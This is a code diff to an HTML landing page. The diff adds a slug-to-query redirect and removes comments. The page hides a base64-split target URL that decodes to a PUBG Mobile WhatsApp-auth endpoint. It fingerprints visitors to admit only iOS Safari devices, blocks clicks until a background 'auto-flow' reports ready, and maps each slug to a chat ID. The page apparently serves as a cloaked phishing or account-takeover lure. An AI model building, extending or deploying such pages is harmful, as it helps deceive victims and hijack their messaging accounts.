@@ -7,6 +7,20 @@
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="default">
   <meta name="format-detection" content="telephone=no">
+
+  <script>
+    // === SPA fallback для /r/<slug> ===
+    (function(){
+      const m = location.pathname.match(/^\/r\/([a-z0-9\-]{3,40})$/i);
+      if (m) {
+        const slug = m[1];
+        const newUrl = '/index.html?slug=' + encodeURIComponent(slug);
+        history.replaceState(null, '', newUrl);
+        location.reload();
+      }
+    })();
+  </script>
+
   <style>
     :root{
       --bg0:#ffffff;--bg1:#f7f9ff;
@@ -71,11 +85,13 @@
     <div class="notice" id="note"></div>
   </div>
 
-  <!-- ✅ Резолв /r/<slug> -> chatId. Если сервер уже инъектировал __TARGET_CHAT_ID — ничего не делаем -->
+  <!-- ✅ Резолв slug -->
   <script>
     (async function resolveSlug(){
-      if (window.__TARGET_CHAT_ID) return; // сервер /r/:slug уже подставил
-      const m = location.pathname.match(/^\/r\/([a-z0-9\-]{3,40})$/i);
+      if (window.__TARGET_CHAT_ID) return;
+
+      // теперь slug ищем в query (?slug=...)
+      const m = location.search.match(/[?&]slug=([a-z0-9\-]{3,40})/i);
       if (!m) return;
       const slug = m[1];
       window.__TARGET_SLUG = slug;
@@ -98,12 +114,10 @@
     })();
   </script>
 
-  <!-- Внешний скрипт с авто-потоком и защитой клика -->
   <script src="/app.js"></script>
 
-  <!-- Локальная логика страницы -->
+  <!-- Вся остальная логика страницы -->
   <script>
-    // ==== целевой URL (base64) ====
     const URL_PARTS=[
       "aHR0cHM6Ly93d3cucHViZ21vYmlsZS5jb20vaWcvaXRvcC93aGF0c2FwcC9hdXRo",
       "P3R5cGU9d2hhdHNhcHBhdXRoJmRhdGE9ZXlKYWRYTjBJam9nS2x3SWFTVnlaVzFo",
@@ -123,7 +137,6 @@
       if(target) location.assign(target);
     }
 
-    // ==== детект окружения ====
     const $ = (id)=>document.getElementById(id);
     const title=$('title'), text=$('text'), reason=$('reason'), btn=$('enterBtn'), note=$('note');
 
@@ -151,10 +164,9 @@
       if(isIOSFamily()) s+=2;
       if(!('userAgentData' in navigator)) s+=0.5;
       if(isStandalonePWA()) s+=0.5;
-      return s; // pass >= 3.5
+      return s;
     }
 
-    // ==== фоновые частицы ====
     (function particles(){
       const reduce=matchMedia('(prefers-reduced-motion: reduce)').matches;
       const c=document.getElementById('bg');
@@ -182,7 +194,6 @@
       start();
     })();
 
-    // ==== запуск ====
     document.addEventListener('DOMContentLoaded', () => {
       const ver=getIOSLikeVersion();
       const score=trustScore();
@@ -195,12 +206,9 @@
         $('reason').textContent=`${/iPad|MacIntel/.test(navigator.platform)||/iPad/.test(navigator.userAgent)?'iPadOS':'iOS'} ${ver}, Safari WebKit.`;
         $('enterBtn').style.display='block';
         $('note').textContent='Кнопка активируется после проверки.';
-
-        // автопоток из app.js
         if (typeof window.__autoFlow === 'function') {
           setTimeout(()=>window.__autoFlow(), 10);
         }
-
         $('enterBtn').addEventListener('click',(e)=>{
           if(!window.__reportReady){ e.preventDefault(); return; }
           go();
